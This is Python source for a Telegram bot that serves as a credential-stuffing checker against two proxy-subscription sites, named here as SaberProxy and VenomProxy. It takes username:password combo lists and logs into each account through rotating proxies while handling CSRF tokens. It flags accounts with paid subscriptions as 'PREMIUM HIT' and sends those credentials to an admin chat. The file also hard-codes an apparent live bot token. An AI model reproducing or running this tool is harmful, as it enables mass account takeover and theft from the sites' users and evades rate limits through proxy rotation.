import asyncio
import os
import time
import urllib.parse
from datetime import datetime

import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ---- config ----
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828944067:AAFNNageWG7K_DfiE_nUiQiE6Mij5N1wP-U")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8712347172"))

SITES = {
    "saber": {
        "name": "SaberProxy",
        "base": "https://saberproxy.net",
        "login": "/api/login",
        "auth": "/api/is-authenticated",
        "csrf": "/sanctum/csrf-cookie",
        "status": "/api/plus-status",
        "status_key": "has_plus",
        "proxy": "/api/get-proxy",
    },
    "venom": {
        "name": "VenomProxy",
        "base": "https://venomproxy.net",
        "login": "/api/login",
        "auth": "/api/is-authenticated",
        "csrf": "/sanctum/csrf-cookie",
        "status": "/api/subscription-status",
        "status_key": "has_subscription",
        "proxy": "/api/get-proxy",
    },
}

DEFAULT_SITE = "saber"

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}

PROXY_TEST_URL = "http://api.ipify.org?format=json"
PROXY_TEST_TIMEOUT = 6

TIMEOUT = 15
THREADS = 1

PROXY_FILE = "proxies.txt"
CHECKED_FILE = "checked.txt"
HITS_FILE = "hits.txt"
FREE_FILE = "free.txt"
ERRORS_FILE = "errors.txt"

E = {
    "check": "✅", "cross": "❌", "fire": "🔥", "bolt": "⚡",
    "gem": "💎", "rocket": "🚀", "star": "⭐", "clock": "⏱",
    "chart": "📊", "lock": "🔒", "globe": "🌐", "wave": "👋",
    "crown": "👑", "spark": "✨", "stop": "🛑", "skull": "💀",
    "party": "🎉", "search": "🔍", "save": "💾", "trash": "🗑",
    "list": "📋", "key": "🔑", "cooldown": "❄️", "new": "🆕",
    "shield": "🛡", "target": "🎯",
}

lock = asyncio.Lock()
stats = {"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()}
checked_set = set()
running = False
stop_flag = False
current_site = DEFAULT_SITE
proxy_pool = []
proxy_lock = asyncio.Lock()
proxy_idx = 0

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "://" in line:
        try:
            u = urllib.parse.urlparse(line)
            if not u.hostname or not u.port:
                return None
            user = urllib.parse.unquote(u.username) if u.username else ""
            pw = urllib.parse.unquote(u.password) if u.password else ""
            auth = f"{user}:{pw}@" if user else ""
            return (u.hostname, u.port, user, pw, f"http://{auth}{u.hostname}:{u.port}")
        except Exception:
            return None
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        try:
            return (host, int(port), "", "", f"http://{host}:{port}")
        except ValueError:
            return None
    if len(parts) == 4:
        host, port, user, pw = parts
        try:
            return (host, int(port), user, pw, f"http://{user}:{pw}@{host}:{port}")
        except ValueError:
            return None
    return None

def format_proxy_line(host, port, user, pw):
    return f"{host}:{port}:{user}:{pw}" if user else f"{host}:{port}"

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]

def save_proxies(lines):
    with open(PROXY_FILE, "w") as f:
        for line in lines:
            f.write(line + "\n")

def load_checked():
    if not os.path.exists(CHECKED_FILE):
        return set()
    with open(CHECKED_FILE) as f:
        return {l.strip() for l in f if l.strip()}

def save_line(path, line):
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")

async def test_proxy(parsed, session):
    _, _, _, _, url = parsed
    try:
        async with session.get(PROXY_TEST_URL, proxy=url,
                               timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return bool(data.get("ip"))
    except Exception:
        return False
    return False

async def init_proxy_pool():
    global proxy_pool, proxy_idx
    async with proxy_lock:
        proxy_pool = load_proxies()
        proxy_idx = 0

async def next_proxy():
    global proxy_idx
    async with proxy_lock:
        if not proxy_pool:
            return None
        p = proxy_pool[proxy_idx % len(proxy_pool)]
        proxy_idx += 1
    parsed = parse_proxy_line(p)
    return parsed[4] if parsed else None

async def check_account(site_key, user, pw, proxy=None):
    site = SITES[site_key]
    base = site["base"]

    try:
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(headers=HEADERS, cookie_jar=jar,
                                         timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as s:
            try:
                async with s.get(f"{base}{site['csrf']}", proxy=proxy) as _:
                    pass
            except Exception as e:
                return {"status": "error", "error_type": "net", "message": str(e)[:80]}

            cookies = {c.key: c.value for c in jar}
            xsrf = cookies.get("XSRF-TOKEN")
            token = urllib.parse.unquote(xsrf) if xsrf else ""
            if not token:
                return {"status": "error", "error_type": "no_csrf", "message": "csrf missing"}

            try:
                async with s.post(f"{base}{site['login']}",
                                  json={"username": user, "password": pw},
                                  headers={"X-XSRF-TOKEN": token},
                                  proxy=proxy, allow_redirects=False) as r:
                    if r.status not in (200, 204):
                        return {"status": "error", "error_type": f"login_{r.status}",
                                "message": f"http_{r.status}"}
            except Exception as e:
                return {"status": "error", "error_type": "login_net", "message": str(e)[:80]}

            try:
                async with s.get(f"{base}{site['auth']}",
                                 headers={"X-XSRF-TOKEN": token},
                                 proxy=proxy) as r:
                    if r.status == 401:
                        return {"status": "bad", "message": "invalid creds"}
                    if r.status != 200:
                        return {"status": "error", "error_type": f"auth_{r.status}",
                                "message": f"http_{r.status}"}
                    try:
                        body = await r.json(content_type=None)
                    except Exception:
                        body = {}
            except Exception as e:
                return {"status": "error", "error_type": "auth_net", "message": str(e)[:80]}

            is_auth = (body.get("isAuth") or body.get("authenticated")
                       or body.get("auth") or False)
            if not is_auth:
                return {"status": "bad", "message": "login failed"}

            premium = False
            duration = 0
            try:
                async with s.get(f"{base}{site['status']}",
                                 headers={"X-XSRF-TOKEN": token},
                                 proxy=proxy) as r:
                    if r.status == 200:
                        sub = await r.json(content_type=None)
                        premium = bool(sub.get(site["status_key"]))
                        duration = sub.get("duration", 0) or 0
            except Exception:
                pass

            if premium:
                return {"status": "hit", "user": user, "site": site["name"], "duration": duration}
            return {"status": "free", "user": user, "site": site["name"], "duration": 0}

    except Exception as e:
        return {"status": "error", "error_type": "crash", "message": str(e)[:100]}

async def check_one(combo, bot, site_key, sem):
    global stop_flag
    if stop_flag:
        return
    if combo in checked_set:
        return

    async with sem:
        user, pw = combo.split(":", 1)
        proxy = await next_proxy()
        result = await check_account(site_key, user.strip(), pw.strip(), proxy=proxy)

    st = result.get("status", "unknown")
    et = result.get("error_type", "")
    site_name = SITES[site_key]["name"]

    async with lock:
        stats["checked"] += 1
        if st == "hit":
            stats["hits"] += 1
        elif st == "bad":
            stats["fails"] += 1
        elif st == "error":
            stats["errors"] += 1

    if st == "hit":
        duration = result.get("duration", 0)
        save_line(HITS_FILE, f"HIT | {combo} | site={site_name} | duration={duration}")
        try:
            await bot.send_message(
                ADMIN_ID,
                f"{E['fire']} <b>PREMIUM HIT — {site_name}</b> {E['fire']}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{E['key']} <code>{combo}</code>\n"
                f"{E['star']} duration: <b>{duration}</b>\n"
                f"{E['crown']} status: <b>PREMIUM / PLUS</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
    elif st == "free":
        save_line(FREE_FILE, f"FREE | {combo} | site={site_name}")
    elif st == "bad":
        pass
    else:
        save_line(ERRORS_FILE, f"ERR | {combo} | {et} | {site_name}")

    async with lock:
        checked_set.add(combo)
    save_line(CHECKED_FILE, f"{site_key}:{combo}")

async def reporter(bot):
    while running and not stop_flag:
        await asyncio.sleep(30)
        elapsed = time.time() - stats["start"]
        cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
        async with proxy_lock:
            pool_size = len(proxy_pool)
        msg = (
            f"{E['chart']} <b>PROGRESS — {SITES[current_site]['name']}</b>\n"
            f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
            f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
            f"{E['cross']} Bad: <code>{stats['fails']}</code>\n"
            f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
            f"{E['globe']} Proxy pool: <code>{pool_size}</code>\n"
            f"{E['bolt']} CPM: <b>{cpm:.1f}</b>"
        )
        try:
            await bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def run_bulk(update, combos, site_key):
    global running, stop_flag, checked_set, current_site

    if running:
        await update.message.reply_text(
            f"{E['cooldown']} already running. /stop first.",
            parse_mode=ParseMode.HTML
        )
        return

    running = True
    stop_flag = False
    current_site = site_key
    stats.update({"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()})

    await init_proxy_pool()
    checked_set = load_checked()

    lines = list(dict.fromkeys([l.strip() for l in combos if l.strip()]))
    if not lines:
        await update.message.reply_text(
            f"{E['cross']} no valid combos.",
            parse_mode=ParseMode.HTML
        )
        running = False
        return

    if not proxy_pool:
        await update.message.reply_text(
            f"{E['cross']} no proxies. /addproxy first.",
            parse_mode=ParseMode.HTML
        )
        running = False
        return

    bot = update.get_bot()
    site = SITES[site_key]

    await update.message.reply_text(
        f"{E['rocket']} <b>SEQUENTIAL CHECK — {site['name']}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['list']} Combos: <code>{len(lines)}</code>\n"
        f"{E['globe']} Proxies: <code>{len(proxy_pool)}</code>\n"
        f"{E['bolt']} Mode: <b>one by one</b> | timeout: <code>{TIMEOUT}s</code>\n"
        f"{E['crown']} only PREMIUM hits → chat",
        parse_mode=ParseMode.HTML
    )

    asyncio.create_task(reporter(bot))
    sem = asyncio.Semaphore(1)

    tasks = [asyncio.create_task(check_one(c, bot, site_key, sem)) for c in lines]
    await asyncio.gather(*tasks)

    elapsed = time.time() - stats["start"]
    running = False

    await update.message.reply_text(
        f"{E['party']} <b>DONE — {site['name']}</b>\n"
        f"{E['clock']} Duration: <code>{elapsed:.1f}s</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['cross']} Bad: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>",
        parse_mode=ParseMode.HTML
    )

    for f in (HITS_FILE, FREE_FILE, ERRORS_FILE):
        if os.path.exists(f) and os.path.getsize(f) > 0:
            try:
                await bot.send_document(ADMIN_ID, open(f, "rb"), filename=f)
            except Exception:
                pass

def admin_only(func):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text(
                f"{E['lock']} not for you.",
                parse_mode=ParseMode.HTML
            )
            return
        return await func(update, ctx)
    return wrapper

@admin_only
async def start_cmd(update, ctx):
    msg = (
        f"{E['wave']} <b>Dual-Site Premium Checker</b> {E['crown']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E['target']} <b>SITES</b>\n"
        f"{E['check']} /saber — active = SaberProxy\n"
        f"{E['check']} /venom — active = VenomProxy\n"
        f"{E['search']} /site — show active\n\n"
        f"{E['rocket']} <b>CHECKING</b>\n"
        f"{E['check']} /check — reply to combos .txt\n"
        f"{E['check']} /checktext — combos after cmd\n"
        f"{E['chart']} /stats — progress\n"
        f"{E['stop']} /stop — halt\n\n"
        f"{E['shield']} <b>PROXY — ADD</b>\n"
        f"{E['check']} /addproxy — reply to proxies .txt\n"
        f"{E['check']} /addproxytext — proxies after cmd\n\n"
        f"{E['trash']} <b>PROXY — REMOVE</b>\n"
        f"{E['check']} /removeproxy — reply to proxies .txt\n"
        f"{E['check']} /removeproxytext — proxies after cmd\n\n"
        f"{E['list']} <b>PROXY — POOL</b>\n"
        f"{E['globe']} /listproxy — view pool\n"
        f"{E['trash']} /cleartproxy — wipe entire pool\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['bolt']} Threads: <code>{THREADS}</code> (sequential) | Active: <b>{SITES[current_site]['name']}</b>\n"
        f"{E['crown']} only PREMIUM hits → chat"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def site_saber(update, ctx):
    global current_site
    current_site = "saber"
    await update.message.reply_text(
        f"{E['check']} active: <b>SaberProxy</b>\n<code>{SITES['saber']['base']}</code>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def site_venom(update, ctx):
    global current_site
    current_site = "venom"
    await update.message.reply_text(
        f"{E['check']} active: <b>VenomProxy</b>\n<code>{SITES['venom']['base']}</code>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def site_show(update, ctx):
    await update.message.reply_text(
        f"{E['target']} active: <b>{SITES[current_site]['name']}</b>\n<code>{SITES[current_site]['base']}</code>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def stats_cmd(update, ctx):
    if not running:
        await update.message.reply_text(
            f"{E['cooldown']} not running.",
            parse_mode=ParseMode.HTML
        )
        return
    elapsed = time.time() - stats["start"]
    cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
    await update.message.reply_text(
        f"{E['chart']} <b>{SITES[current_site]['name']}</b>\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['cross']} Bad: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
        f"{E['bolt']} CPM: <b>{cpm:.1f}</b>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def stop_cmd(update, ctx):
    global stop_flag
    stop_flag = True
    await update.message.reply_text(
        f"{E['stop']} stopping...",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def check_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with combos.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    combos = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await run_bulk(update, combos, current_site)

@admin_only
async def check_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send combos on new lines after /checktext",
            parse_mode=ParseMode.HTML
        )
        return
    combos = [l.strip() for l in parts[1].splitlines() if l.strip()]
    await run_bulk(update, combos, current_site)

async def _process_proxy_lines(update, raw_lines):
    parsed = [p for p in (parse_proxy_line(l) for l in raw_lines) if p]
    if not parsed:
        await update.message.reply_text(
            f"{E['cross']} no valid proxy lines.",
            parse_mode=ParseMode.HTML
        )
        return
    await update.message.reply_text(
        f"{E['search']} testing <code>{len(parsed)}</code> proxies...",
        parse_mode=ParseMode.HTML
    )
    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        sem = asyncio.Semaphore(200)
        async def probe(p):
            async with sem:
                return p, await test_proxy(p, session)
        results = await asyncio.gather(*[probe(p) for p in parsed])

    live = [format_proxy_line(p[0], p[1], p[2], p[3]) for p, ok in results if ok]
    existing = set()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            existing = {l.strip() for l in f if l.strip()}
    new_ones = [p for p in live if p not in existing]
    with open(PROXY_FILE, "a") as f:
        for p in new_ones:
            f.write(p + "\n")

    await update.message.reply_text(
        f"{E['shield']} <b>PROXY CHECK DONE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Tested: <code>{len(parsed)}</code>\n"
        f"{E['check']} Live: <b>{len(live)}</b>\n"
        f"{E['cross']} Dead: <b>{len(parsed) - len(live)}</b>\n"
        f"{E['new']} New: <b>{len(new_ones)}</b>\n"
        f"{E['gem']} Pool: <b>{len(existing) + len(new_ones)}</b>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def addproxy_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with proxies.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await _process_proxy_lines(update, lines)

@admin_only
async def addproxy_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send proxies on new lines after /addproxytext",
            parse_mode=ParseMode.HTML
        )
        return
    await _process_proxy_lines(update, [l.strip() for l in parts[1].splitlines() if l.strip()])

async def _do_remove(update, raw_lines):
    to_remove = set()
    for line in raw_lines:
        parsed = parse_proxy_line(line)
        if parsed:
            to_remove.add(parsed[4])

    if not to_remove:
        await update.message.reply_text(
            f"{E['cross']} no valid proxy lines.",
            parse_mode=ParseMode.HTML
        )
        return

    async with proxy_lock:
        kept = []
        removed = []
        for p in proxy_pool:
            parsed = parse_proxy_line(p)
            if parsed and parsed[4] in to_remove:
                removed.append(p)
            else:
                kept.append(p)

        save_proxies(kept)
        globals()["proxy_pool"] = kept

    await update.message.reply_text(
        f"{E['trash']} <b>PROXY REMOVAL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Requested: <code>{len(to_remove)}</code>\n"
        f"{E['cross']} Removed: <b>{len(removed)}</b>\n"
        f"{E['cooldown']} Not found: <code>{len(to_remove) - len(removed)}</code>\n"
        f"{E['gem']} Pool now: <b>{len(kept)}</b>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def removeproxy_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with proxies to remove.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await _do_remove(update, lines)

@admin_only
async def removeproxy_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send proxies on new lines after /removeproxytext",
            parse_mode=ParseMode.HTML
        )
        return
    await _do_remove(update, [l.strip() for l in parts[1].splitlines() if l.strip()])

@admin_only
async def listproxy_cmd(update, ctx):
    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text(
            f"{E['cooldown']} proxy pool empty.",
            parse_mode=ParseMode.HTML
        )
        return
    preview = "\n".join(proxies[:10])
    more = f"\n... +{len(proxies) - 10} more" if len(proxies) > 10 else ""
    await update.message.reply_text(
        f"{E['globe']} <b>PROXY POOL</b>\n"
        f"{E['gem']} Size: <b>{len(proxies)}</b>\n\n"
        f"<code>{preview}</code>{more}",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def cleartproxy_cmd(update, ctx):
    global proxy_pool, proxy_idx
    if os.path.exists(PROXY_FILE):
        os.remove(PROXY_FILE)
    async with proxy_lock:
        proxy_pool = []
        proxy_idx = 0
    await update.message.reply_text(
        f"{E['trash']} proxy pool wiped.",
        parse_mode=ParseMode.HTML
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("saber", site_saber))
    app.add_handler(CommandHandler("venom", site_venom))
    app.add_handler(CommandHandler("site", site_show))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("check", check_file))
    app.add_handler(CommandHandler("checktext", check_text))
    app.add_handler(CommandHandler("addproxy", addproxy_file))
    app.add_handler(CommandHandler("addproxytext", addproxy_text))
    app.add_handler(CommandHandler("removeproxy", removeproxy_file))
    app.add_handler(CommandHandler("removeproxytext", removeproxy_text))
    app.add_handler(CommandHandler("listproxy", listproxy_cmd))
    app.add_handler(CommandHandler("cleartproxy", cleartproxy_cmd))
    print("bot up. admin=", ADMIN_ID)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
